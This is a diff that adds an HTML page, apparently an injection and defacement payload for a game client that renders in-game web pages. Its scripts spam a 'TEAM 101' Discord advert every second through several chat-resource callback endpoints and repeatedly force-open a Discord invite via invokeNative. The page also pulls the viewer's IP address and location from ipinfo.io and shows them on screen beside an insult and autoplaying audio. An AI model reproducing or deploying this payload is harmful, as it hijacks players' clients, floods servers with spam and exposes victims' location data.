@@ -1,0 +1,104 @@
+
+<!DOCTYPE html>
+
+
+const msg = `👑 TEAM 101 - .gg/T101 ! 👑`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://discord.gg/t101</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://cdn.discordapp.com/attachments/1389969211715223586/1390245362471669820/TEAM_101_blurred_text.gif?ex=688e72a3&is=688d2123&hm=011ff4f27c6fedcbdb7bcd168b97386a87ee51799ae96a9ffc831438dc86a37c&') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #FF0000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .image-container img {
+            width: 750px; 
+            height: auto;
+            border: 2px solid #FF0000; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.8); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #FF0000; 
+            text-shadow: 0px 0px 8px #FF0000, 0px 0px 15px #FF0000, 0px 0px 25px #FF0000; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #FF0000; 
+            text-shadow: 0px 0px 8px #FF0000, 0px 0px 15px #FF0000, 0px 0px 25px #FF0000; 
+            letter-spacing: 4.5px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="https://cdn.discordapp.com/attachments/1389969211715223586/1390245362471669820/TEAM_101_blurred_text.gif?ex=688e72a3&is=688d2123&hm=011ff4f27c6fedcbdb7bcd168b97386a87ee51799ae96a9ffc831438dc86a37c&" alt="Discord Image">
+    </div>
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1364231189862547458/1401028787910742036/3dc5a97add802d07.mp3?ex=688ec93c&is=688d77bc&hm=2ad7aca4a5e269242a52ddaeeb4cd4373b34ab025b144e432d6649bb501a2d86&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+   <div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text"> يا منايك team 101 فوق راسكم 
+
+by:alyouzef | kjvusbvs
+ | aboamsha
+</div>
+
+    <script>
+         fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            delete data.readme;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.textContent = JSON.stringify(data, null, 2);
+        });
+    </script>
+
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/T101");
+window.invokeNative("openUrl", "https://discord.gg/T101");
+window.invokeNative("openUrl", "https://discord.gg/T101");
+window.invokeNative("openUrl", "https://discord.gg/T101");
+}, 1000);
+    </script>
+</body>
+</html>
